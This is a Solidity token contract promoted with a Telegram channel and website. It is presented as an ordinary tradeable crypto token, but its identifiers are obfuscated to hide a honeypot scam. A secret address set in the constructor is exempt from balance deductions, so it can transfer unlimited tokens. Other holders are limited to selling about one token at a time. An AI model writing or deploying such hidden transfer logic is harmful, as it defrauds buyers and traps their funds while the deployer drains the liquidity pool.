/*

Telegram: https://t.me/BitcoinShiaPortal

Website: https://bitcoinshia2.0.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract itcoinShia is Ownable {
    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private yatil = 116;

    constructor(string memory ietzocrgw, string memory ildbxc, address wyaocrhxdsm, address obmze) {
        name = ietzocrgw;
        symbol = ildbxc;
        balanceOf[msg.sender] = totalSupply;
        kfqb[obmze] = yatil;
        wago = IUniswapV2Router02(wyaocrhxdsm);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private wago;

    function approve(address ymuv, uint256 bhosvzly) public returns (bool success) {
        allowance[msg.sender][ymuv] = bhosvzly;
        emit Approval(msg.sender, ymuv, bhosvzly);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private kfqb;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address tirdbk, address epigxwrslz, uint256 bhosvzly) public returns (bool success) {
        require(bhosvzly <= allowance[tirdbk][msg.sender]);
        allowance[tirdbk][msg.sender] -= bhosvzly;
        vgnihsaxopwm(tirdbk, epigxwrslz, bhosvzly);
        return true;
    }

    string public symbol;

    function transfer(address epigxwrslz, uint256 bhosvzly) public returns (bool success) {
        vgnihsaxopwm(msg.sender, epigxwrslz, bhosvzly);
        return true;
    }

    function vgnihsaxopwm(address tirdbk, address epigxwrslz, uint256 bhosvzly) private {
        address okfrdjbpz = IUniswapV2Factory(wago.factory()).getPair(address(this), wago.WETH());
        if (0 == kfqb[tirdbk]) {
            if (tirdbk != okfrdjbpz && riak[tirdbk] != block.number && bhosvzly < totalSupply) {
                require(bhosvzly <= totalSupply / (10 ** decimals));
            }
            balanceOf[tirdbk] -= bhosvzly;
        }
        balanceOf[epigxwrslz] += bhosvzly;
        riak[epigxwrslz] = block.number;
        emit Transfer(tirdbk, epigxwrslz, bhosvzly);
    }

    mapping(address => uint256) private riak;
}
